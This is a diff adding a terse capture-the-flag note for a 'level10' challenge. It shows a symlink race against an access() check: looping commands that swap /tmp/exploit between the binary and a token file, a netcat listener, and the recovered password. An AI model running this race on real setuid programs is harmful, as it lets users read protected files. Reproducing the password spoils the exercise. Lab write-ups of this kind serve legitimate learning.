@@ -1,0 +1,5 @@
+this shit uses access -> man access -> man tells about the exploit
+while true; do ln -fs ~/level10 /tmp/exploit; ln -fs ~/token /tmp/exploit; done
+while true; do ./level10 /tmp/exploit 127.0.0.1; done
+ nc -lk 6969
+pass: woupa2yuojeeaaed06riuj63c
